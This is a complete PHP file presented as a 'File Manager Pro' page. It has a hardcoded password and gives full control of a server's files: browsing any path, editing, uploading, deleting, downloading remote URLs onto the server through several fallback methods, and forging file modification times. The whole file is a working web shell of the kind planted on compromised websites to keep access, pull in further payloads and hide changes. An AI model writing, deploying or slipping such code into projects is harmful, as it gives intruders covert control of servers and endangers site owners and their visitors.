<?php
session_start();
$password = 'admin123';
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['password']) && $_POST['password']==$password) {
        $_SESSION['logged_in'] = true; header('Location:'); exit;
    }
    echo '<!DOCTYPE html><html><body class="p-4"><form method="post"><input type="password" name="password" placeholder="Password" class="border px-2"> <button class="bg-green-500 text-white px-2">Login</button></form></body></html>'; exit;
}

// Path
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();
$parent = dirname($path);

// Handle sort preference
if(isset($_GET['sort'])) $_SESSION['sort']=$_GET['sort'];
if(isset($_GET['order'])) $_SESSION['order']=$_GET['order'];
$sort = $_SESSION['sort'] ?? 'name';
$order = $_SESSION['order'] ?? 'asc';

// Handle search
$search = $_GET['search'] ?? '';

// Handle POST actions
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['new_folder'])) mkdir($path.'/'.basename($_POST['new_folder']));
    elseif (isset($_POST['new_file'])) file_put_contents($path.'/'.basename($_POST['new_file']), '');
    elseif (isset($_POST['delete'])) { $t=$path.'/'.basename($_POST['delete']); is_dir($t)?rmdir($t):unlink($t);}
    elseif (isset($_POST['rename_from']) && isset($_POST['rename_to'])) rename($path.'/'.basename($_POST['rename_from']),$path.'/'.basename($_POST['rename_to']));
    elseif (isset($_POST['edit_file']) && isset($_POST['content'])) file_put_contents($path.'/'.basename($_POST['edit_file']),$_POST['content']);
    elseif (isset($_FILES['files'])) foreach($_FILES['files']['tmp_name'] as $i=>$tmp) move_uploaded_file($tmp,$path.'/'.basename($_FILES['files']['name'][$i]));
    elseif (isset($_POST['update_mtime']) && isset($_POST['mtime_value'])) { $f=$path.'/'.basename($_POST['update_mtime']); @touch($f,strtotime($_POST['mtime_value']));}
    elseif (isset($_POST['get_content'])) { $f=$path.'/'.basename($_POST['get_content']); if(is_file($f)) echo file_get_contents($f); exit;}
    elseif (isset($_POST['download_url'],$_POST['output_name'],$_POST['method'])) {
        $url=trim($_POST['download_url']); $out=$path.'/'.basename($_POST['output_name']); $method=$_POST['method'];
        switch($method){
            case 'file_get_contents': $d=@file_get_contents($url); if($d!==false)file_put_contents($out,$d); break;
            case 'copy': @copy($url,$out); break;
            case 'fopen': $in=@fopen($url,'rb'); $outf=@fopen($out,'wb'); if($in&&$outf){while(!feof($in))fwrite($outf,fread($in,8192)); fclose($in); fclose($outf);} break;
            case 'stream_context': $ctx=stream_context_create(); $d=@file_get_contents($url,false,$ctx); if($d!==false)file_put_contents($out,$d); break;
            case 'curl':
                $ch=curl_init($url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $d=curl_exec($ch); curl_close($ch); if($d!==false)file_put_contents($out,$d);
                break;
        }
    }
}

// Scan dir
$files=scandir($path);
$folders=[];$regular_files=[];
foreach($files as $f){
    if($f=='.'||$f=='..')continue;
    if($search && stripos($f,$search)===false) continue;
    $fp=$path.'/'.$f; $mtime=filemtime($fp);
    if(is_dir($fp)) $folders[]= ['name'=>$f,'mtime'=>$mtime];
    else $regular_files[]= ['name'=>$f,'mtime'=>$mtime];
}

// Sort
$sort_func = function($a,$b)use($sort,$order){
    if($sort=='mtime') return $order=='asc' ? $a['mtime']<=>$b['mtime'] : $b['mtime']<=>$a['mtime'];
    else return $order=='asc' ? strcasecmp($a['name'],$b['name']) : strcasecmp($b['name'],$a['name']);
};
usort($folders,$sort_func); usort($regular_files,$sort_func);

// URL builder
function toggle_order($c){return $c=='asc'?'desc':'asc';}
function sort_url($by,$cs,$co,$p,$s){$o=($by==$cs)?toggle_order($co):'asc'; return "?path=".urlencode($p)."&sort=$by&order=$o&search=".urlencode($s);}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>File Manager Pro</title>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
<script>
$(function(){
    $('.edit-btn').click(function(){ let f=$(this).data('file'); $('.edit-filename').text(f); $.post('',{get_content:f},d=>{$('#editModal textarea').val(d);$('#editModal input[name="edit_file"]').val(f);$('#editModal').removeClass('hidden');});});
    $('.delete-btn').click(function(){ $('#deleteModal input[name="delete"]').val($(this).data('file')); $('#deleteModal span').text($(this).data('file')); $('#deleteModal').removeClass('hidden');});
    $('.rename-btn').click(function(){ $('#renameModal input[name="rename_from"]').val($(this).data('file')); $('#renameModal input[name="rename_to"]').val($(this).data('file')); $('#renameModal').removeClass('hidden');});
    $('.mtime-btn').click(function(){ let f=$(this).data('file'); let dt=$(this).data('mtime'); $('#mtimeModal input[name="update_mtime"]').val(f); $('#mtimeModal input[name="mtime_value"]').val(dt); $('#mtimeModal span').text(f); $('#mtimeModal').removeClass('hidden');});
    $('#showNewFile').click(()=>$('#newFileModal').removeClass('hidden'));
    $('#showNewFolder').click(()=>$('#newFolderModal').removeClass('hidden'));
    $('#showDownloader').click(()=>$('#downloaderModal').removeClass('hidden'));
    $('#uploadBtn').click(()=>$('#uploadInput').click());
    $('.close').click(()=>$('.modal').addClass('hidden'));
    $('#uploadInput').change(()=>$('#uploadForm').submit());
});
</script>
</head>
<body class="bg-gray-100 p-4">
<h1 class="text-2xl font-bold mb-4">📂 <?=htmlspecialchars($path)?></h1>
<div class="flex justify-between mb-4">
<?php if($path!=$parent):?><a href="?path=<?=urlencode($parent)?>" class="bg-gray-300 px-2 py-1 rounded">⬅️ Up</a><?php endif;?>
<div class="flex space-x-2">
<form method="get" class="flex space-x-1"><input type="hidden" name="path" value="<?=htmlspecialchars($path)?>"><input type="text" name="search" value="<?=htmlspecialchars($search)?>" placeholder="Search..." class="border px-2"><button class="bg-gray-300 px-2 rounded">🔍</button></form>
<button id="showDownloader" class="bg-purple-500 text-white px-2 py-1 rounded">⬇️ Downloader</button>
<button id="showNewFile" class="bg-green-500 text-white px-2 py-1 rounded">📄 New File</button>
<button id="showNewFolder" class="bg-green-500 text-white px-2 py-1 rounded">📁 New Folder</button>
<form method="post" enctype="multipart/form-data" id="uploadForm" class="inline">
<input type="file" name="files[]" multiple id="uploadInput" class="hidden">
<button type="button" id="uploadBtn" class="bg-blue-500 text-white px-2 py-1 rounded">⬆️ Upload</button>
</form>
</div></div>

<table class="min-w-full bg-white border">
<tr class="bg-gray-200">
<th class="p-2 text-left"><a href="<?=sort_url('name',$sort,$order,$path,$search)?>" class="hover:underline">Name<?=($sort=='name'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
<th class="p-2"><a href="<?=sort_url('mtime',$sort,$order,$path,$search)?>" class="hover:underline">Last Modified<?=($sort=='mtime'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
<th class="p-2">Action</th></tr>
<?php foreach(array_merge($folders,$regular_files) as $f):$fp=$path.'/'.$f['name'];$mtime=date('Y-m-d\TH:i',$f['mtime']); ?>
<tr class="border-t">
<td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500 underline">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
<td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-mtime="<?=$mtime?>" class="mtime-btn underline text-blue-500"><?=date('Y-m-d H:i',$f['mtime'])?></button></td>
<td class="p-2 space-x-1"><?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f['name'])?>" class="edit-btn bg-yellow-300 px-2 rounded">✏️ Edit</button><?php endif;?><button data-file="<?=htmlspecialchars($f['name'])?>" class="rename-btn bg-green-300 px-2 rounded">✏️ Rename</button><button data-file="<?=htmlspecialchars($f['name'])?>" class="delete-btn bg-red-400 px-2 rounded">🗑️ Delete</button></td></tr><?php endforeach;?>
</table>

<!-- Modals -->
<div id="editModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 w-1/2 rounded">
<h2 class="text-xl mb-2">✏️ Edit: <span class="edit-filename text-blue-600"></span></h2>
<form method="post"><input type="hidden" name="edit_file">
<textarea name="content" class="w-full h-64 border mb-2 font-mono"></textarea>
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">💾 Save</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Close</button></div>
</form></div></div>

<div id="deleteModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded">
<form method="post"><p>Delete <span class="font-bold"></span> ?</p><input type="hidden" name="delete">
<div class="flex justify-between mt-2"><button class="bg-red-500 text-white px-4 py-1 rounded">🗑️ Delete</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="renameModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><input type="hidden" name="rename_from">
<p>New name:</p><input name="rename_to" class="border px-2 mb-2">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">↩️ Rename</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="newFileModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><p>File name:</p><input name="new_file" class="border px-2 mb-2">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">📄 Create</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="newFolderModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><p>Folder name:</p><input name="new_folder" class="border px-2 mb-2">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">📁 Create</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="mtimeModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><input type="hidden" name="update_mtime">
<p>Edit Last Modified of <span class="font-bold"></span>:</p>
<input type="datetime-local" name="mtime_value" class="border px-2 mb-2">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">⏰ Update</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="downloaderModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><p>URL Source:</p><input name="download_url" class="border px-2 mb-2 w-full"><p>Output Name:</p><input name="output_name" class="border px-2 mb-2 w-full"><p>Method:</p><select name="method" class="border px-2 mb-2 w-full"><option>file_get_contents</option><option>cURL</option><option>fopen</option><option>copy</option><option>stream_context</option></select>
<div class="flex justify-between"><button class="bg-purple-500 text-white px-4 py-1 rounded">⬇️ Download</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
</body></html>
